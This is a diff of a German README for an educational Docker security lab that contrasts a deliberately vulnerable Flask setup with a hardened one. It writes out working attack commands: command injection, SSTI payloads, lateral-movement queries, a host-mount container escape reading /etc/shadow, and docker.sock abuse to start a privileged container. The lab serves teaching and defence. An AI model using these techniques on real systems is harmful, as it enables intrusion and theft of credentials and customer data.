@@ -1,107 +1,302 @@
-# Docker Container Security — Demo-Projekt
+# Docker Container Security — Lehrprojekt
 
-## Was ist das?
+Dieses Projekt demonstriert typische Sicherheitsschwachstellen in Docker-Container-Umgebungen
+sowie deren Gegenmaßnahmen. Es enthält eine absichtlich verwundbare Web-Applikation und eine
+gehärtete Vergleichsversion, sodass Angriffsvektoren praktisch nachvollzogen werden können.
 
-Ein komplettes Demo-Setup für deine Präsentation zu Docker Container Security.
-Du bekommst eine verwundbare Docker-Umgebung und eine gehärtete Version zum Vergleich.
+> **Hinweis:** Dieses Setup enthält absichtliche Schwachstellen und dient ausschließlich
+> zu Bildungszwecken. Niemals in einer Produktionsumgebung einsetzen.
 
 ---
 
-## Projektstruktur
+## Voraussetzungen
+
+- Docker Engine ≥ 20.x oder Docker Desktop ≥ 4.x
+- Docker Compose v2
+- Linux-Host empfohlen (Container Escape und Docker-Socket-Angriffe sind unter Docker Desktop
+  auf macOS/Windows eingeschränkt, alle anderen Schwachstellen funktionieren plattformübergreifend)
+
+---
+
+## Architektur
 
 ```
-docker-security-demo/
-├── docker-compose.yml              ← Verwundbare Version
-├── docker-compose.hardened.yml     ← Gehärtete Version
-├── DEMO_SCRIPT.sh                  ← Alle Befehle für die Live-Demo
-├── init.sql                        ← Datenbank mit Testdaten
-├── webapp/
-│   ├── Dockerfile                  ← Verwundbares Image (root, tools)
-│   ├── Dockerfile.hardened         ← Gehärtetes Image (non-root, minimal)
-│   ├── app.py                      ← Verwundbare Flask-App
-│   └── app_hardened.py             ← Gehärtete Flask-App
-└── admin-service/
-    ├── Dockerfile
-    └── app.py                      ← Simulierter interner Service
+                        Internet / Browser
+                               |
+                           Port 5001
+                               |
+                     ┌─────────▼─────────┐
+                     │  webapp (Flask)    │  ← verwundbar: root, privileged,
+                     │  frontend-Netz     │    docker.sock, keine Validierung
+                     │  + backend-Netz    │
+                     └────────┬──────────┘
+                              │ backend-Netz (unsegmentiert)
+               ┌──────────────┼──────────────┐
+               │                             │
+      ┌────────▼────────┐         ┌──────────▼────────┐
+      │  db (MySQL 8.0) │         │  admin-service     │
+      │  Passwort: root │         │  Port 8080         │
+      │  (kein Auth)    │         │  (API-Keys offen)  │
+      └─────────────────┘         └────────────────────┘
 ```
 
 ---
 
 ## Schnellstart
 
-### 1. Verwundbare Version starten
+### Verwundbare Version starten
+
 ```bash
-cd docker-security-demo
 docker compose up -d --build
 ```
-Warte ~30 Sekunden (MySQL muss starten), dann öffne: **http://localhost:5000**
 
-### 2. Demo durchführen (siehe DEMO_SCRIPT.sh)
+Ca. 30 Sekunden warten (MySQL-Initialisierung), dann im Browser öffnen:
+**http://localhost:5001**
 
-### 3. Gehärtete Version starten
+### Gehärtete Version starten (zum Vergleich)
+
 ```bash
 docker compose down
 docker compose -f docker-compose.hardened.yml up -d --build
 ```
 
-### 4. Aufräumen
+**http://localhost:5001** (erkennbar am grünen Design)
+
+### Aufräumen
+
 ```bash
 docker compose down
-# oder
+# oder für die gehärtete Version:
 docker compose -f docker-compose.hardened.yml down
 ```
 
 ---
 
-## Die 3 Angriffsschritte
+## Projektstruktur
 
-### Schritt 1: Command Injection
-Im Ping-Feld eingeben:
+```
+docker-container-security/
+├── docker-compose.yml              ← Verwundbare Umgebung
+├── docker-compose.hardened.yml     ← Gehärtete Umgebung
+├── init.sql                        ← Testdatenbank mit Kundendaten
+├── webapp/
+│   ├── Dockerfile                  ← Verwundbares Image (root, Tools, Layer-Secrets)
+│   ├── Dockerfile.hardened         ← Gehärtetes Image (non-root, minimal)
+│   ├── app.py                      ← Verwundbare Flask-App (Command Injection + SSTI)
+│   └── app_hardened.py             ← Gehärtete Flask-App
+└── admin-service/
+    ├── Dockerfile
+    └── app.py                      ← Interner Service mit simulierten API-Keys
+```
+
+---
+
+## Demonstrierte Schwachstellen
+
+### 1. Command Injection
+
+**Ursache:** Die Nutzereingabe im Ping-Formular wird ohne Validierung direkt in einen
+Shell-Befehl eingebettet (`subprocess.run(..., shell=True)`).
+
+**Angriff:** Im Ping-Feld der Web-Oberfläche eingeben:
+
 ```
 8.8.8.8; whoami
 ```
-→ Ausgabe: `root` (wir haben Code-Ausführung im Container!)
 
-### Schritt 2: Lateral Movement
+Ausgabe: `root` — der Angreifer führt beliebige Befehle als Root im Container aus.
+
+Weitere Beispiele:
 ```
+8.8.8.8; id
+8.8.8.8; cat /etc/passwd
+8.8.8.8; cat /proc/1/cgroup    ← bestätigt: wir sind in einem Docker-Container
+```
+
+**Ort:** `webapp/app.py` → `/ping`-Endpoint
+
+---
+
+### 2. Server-Side Template Injection (SSTI)
+
+**Ursache:** Der `/report`-Endpoint baut die Nutzereingabe direkt als Zeichenkette in ein
+Jinja2-Template ein und rendert es anschließend. Jinja2-Ausdrücke in der Eingabe werden
+vom Template-Engine ausgewertet.
+
+**Angriff:** Im Browser aufrufen:
+
+```
+http://localhost:5001/report?title={{7*7}}
+```
+
+Ausgabe zeigt `49` statt des eingegebenen Textes — die Template-Expression wurde serverseitig
+ausgewertet. Weiterführend:
+
+```
+# Flask-Konfiguration mit Secret-Key auslesen:
+http://localhost:5001/report?title={{config}}
+
+# Remote Code Execution (Python-Subclass-Chain):
+http://localhost:5001/report?title={{''.__class__.__mro__[1].__subclasses__()}}
+```
+
+**Ort:** `webapp/app.py` → `/report`-Endpoint
+
+---
+
+### 3. Lateral Movement
+
+**Ursache:** Die Webapp ist gleichzeitig im `frontend`- und `backend`-Netz. Dadurch kann
+ein Angreifer, der die Webapp kompromittiert hat, alle internen Dienste über Docker-DNS
+direkt erreichen.
+
+**Angriff:** Nach erfolgreicher Command Injection:
+
+```bash
+# Admin-Service mit API-Keys abfragen (über Docker-DNS erreichbar):
 ; curl -s http://admin:8080/api/config
+
+# Datenbank mit schwachem Passwort direkt abfragen:
 ; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
 ```
-→ API-Keys und Kundendaten offengelegt
 
-### Schritt 3: Container Escape
+Ausgabe: AWS-Keys, Admin-Zugangsdaten, vollständige Kundendaten inkl. Kreditkarteninformationen.
+
+**Ort:** Netzwerkkonfiguration in `docker-compose.yml`
+
+---
+
+### 4. Container Escape (Privileged Mode)
+
+**Ursache:** Der Container läuft mit `privileged: true`. Das gibt dem Container uneingeschränkten
+Zugriff auf alle Linux-Kernel-Features des Hosts, einschließlich der Fähigkeit, Host-Devices
+einzuhängen.
+
+**Angriff:**
+
+```bash
+# Prüfen ob privilegiert (Festplatten sichtbar = privilegiert):
+; fdisk -l 2>/dev/null | head -10
+
+# Verfügbare Block-Devices anzeigen:
+; lsblk
+
+# Host-Dateisystem einhängen und auslesen:
+; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/
+; cat /mnt/host/etc/hostname
+; cat /mnt/host/etc/shadow | head -5
 ```
-; fdisk -l 2>/dev/null | head -5
-; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && cat /mnt/host/etc/hostname
+
+Ergebnis: Vollständiger Lesezugriff auf das Host-Dateisystem — der Container ist ausgebrochen.
+
+> **Hinweis:** Device-Name kann variieren (sda1, vda1, xvda1). `lsblk` zeigt den richtigen Namen.
+> Unter Docker Desktop (macOS/Windows) ist das Host-System die VM, nicht der Mac/Windows-Rechner.
+
+**Ort:** `docker-compose.yml` → `privileged: true`
+
+---
+
+### 5. Secrets in Umgebungsvariablen
+
+**Ursache:** Passwörter und API-Keys werden als Environment-Variablen an den Container
+übergeben. Diese sind für jeden Prozess im Container über `/proc/1/environ` lesbar —
+und werden in `docker inspect` im Klartext angezeigt.
+
+**Angriff:**
+
+```bash
+# Alle Umgebungsvariablen des Containers auslesen:
+; cat /proc/1/environ | tr '\0' '\n'
+
+# Alternativ von außen (als Docker-Host):
+docker inspect webapp-container-name | grep -A5 '"Env"'
 ```
-→ Zugriff auf das Host-Dateisystem
+
+Ausgabe: `DB_PASSWORD=root`, `SECRET_API_KEY=sk-prod-...`, `JWT_SECRET=...`
+
+**Ort:** `docker-compose.yml` → `environment:`-Block der webapp
+
+---
+
+### 6. Secrets in Image-Layern (Docker History)
+
+**Ursache:** Passwörter oder Zugangsdaten, die in einem `RUN`-Befehl im Dockerfile verwendet
+werden, bleiben in der Image-History gespeichert — auch wenn sie in einem späteren Layer
+wieder gelöscht werden. Über `docker history` sind sie rekonstruierbar.
+
+**Angriff:**
+
+```bash
+# Image-History mit vollständigen Befehlen anzeigen:
+docker history --no-trunc docker-container-security-webapp
+
+# Oder aus dem laufenden Container:
+; cat /etc/environment
+```
+
+Ausgabe: `BACKUP_DB_URL=mysql://backup_user:Backup@2024!@db-prod.firma.local/kundenportal`
+
+**Ort:** `webapp/Dockerfile` → `RUN echo "BACKUP_DB_URL=..." >> /etc/environment`
+
+---
+
+### 7. Docker Socket Exposure
+
+**Ursache:** Die Datei `/var/run/docker.sock` ist in den Container eingebunden. Über diesen
+Unix-Socket spricht die Docker CLI mit dem Docker-Daemon. Zugriff darauf entspricht
+Root-Zugriff auf den Host — ein Angreifer kann beliebige Container starten, stoppen und
+den Host vollständig übernehmen.
+
+**Angriff:**
+
+```bash
+# Laufende Container über Docker-API auflisten:
+; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool
+
+# Neuen privilegierten Container starten und Host-Root mounten:
+; curl -s --unix-socket /var/run/docker.sock \
+    -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"],"Privileged":true}' \
+    "http://localhost/containers/create?name=escape"
+
+# Container starten:
+; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
+
+# Logs (Ausgabe des Befehls) lesen:
+; curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=1"
+```
+
+Ergebnis: Vollständiger Host-Zugriff, unabhängig von `--privileged` oder Capabilities — allein
+durch den Socket-Mount.
+
+**Ort:** `docker-compose.yml` → `volumes: - /var/run/docker.sock:/var/run/docker.sock`
 
 ---
 
 ## Härtungsmaßnahmen (Vergleich)
 
-| # | Maßnahme | Verwundbar | Gehärtet |
-|---|----------|-----------|----------|
-| 1 | Input-Validierung | ❌ Keine | ✅ Regex-Whitelist |
-| 2 | Container-User | ❌ root | ✅ appuser |
-| 3 | Privileged Mode | ❌ --privileged | ✅ Nicht gesetzt |
-| 4 | Capabilities | ❌ Alle | ✅ cap_drop: ALL |
-| 5 | Netzwerk | ❌ Alles verbunden | ✅ Segmentiert |
-| 6 | Filesystem | ❌ Beschreibbar | ✅ read_only: true |
-| 7 | DB-Passwort | ❌ root:root | ✅ Starkes Passwort |
+| Schwachstelle | Verwundbar | Gehärtet |
+|---|---|---|
+| Input-Validierung | keine (`shell=True`) | Regex-Whitelist, Liste als Argumente |
+| Template-Rendering | Nutzereingabe als Template | festes Template, Werte als Variablen |
+| Container-User | `root` | `appuser` (non-root) |
+| Privileged Mode | `privileged: true` | nicht gesetzt |
+| Linux Capabilities | alle | `cap_drop: ALL` |
+| Privilege Escalation | möglich | `no-new-privileges: true` |
+| Netzwerksegmentierung | webapp in frontend + backend | webapp nur in frontend |
+| Backend-Netz | erreichbar von außen | `internal: true` |
+| Filesystem | beschreibbar | `read_only: true` + `/tmp` als tmpfs |
+| Datenbankpasswort | `root` | starkes Zufallspasswort |
+| Docker Socket | gemountet | nicht exponiert |
+| Secrets | in Env-Vars und Image-Layern | (außerhalb des Scopes: Docker Secrets / Vault) |
 
 ---
 
 ## Troubleshooting
 
-- **MySQL startet nicht?** → `docker compose logs db` prüfen, ggf. länger warten
-- **Port 5000 belegt?** → In docker-compose.yml den Port ändern (z.B. `5001:5000`)
-- **Container Escape klappt nicht?** → Das Host-Device kann variieren. Nutze `; lsblk` um den richtigen Device-Namen zu finden
-- **Docker Desktop unter Windows/Mac?** → Container Escape funktioniert nur mit Linux-Host. Unter Docker Desktop zeigst du den Befehl und erklärst, warum er auf einem echten Linux-Server funktionieren würde.
-
----
-
-## ⚠️ Sicherheitshinweis
-
-Dieses Projekt enthält **absichtliche Schwachstellen** und dient ausschließlich
-zu Bildungszwecken. **Niemals** in einer Produktionsumgebung einsetzen!
+- **MySQL startet nicht?** → `docker compose logs db` prüfen, ggf. 60 Sekunden warten
+- **Port 5001 belegt?** → In `docker-compose.yml` den Port ändern (z.B. `5002:5000`)
+- **Container Escape klappt nicht?** → `; lsblk` zeigt den richtigen Device-Namen. Unter Docker Desktop ist der Escape auf die interne VM beschränkt
+- **Docker Socket nicht erreichbar?** → `ls -la /var/run/docker.sock` im Container prüfen; Socket muss existieren und lesbar sein
+- **SSTI zeigt keinen Effekt?** → URL korrekt enkodieren: `{{7*7}}` → `%7B%7B7*7%7D%7D`
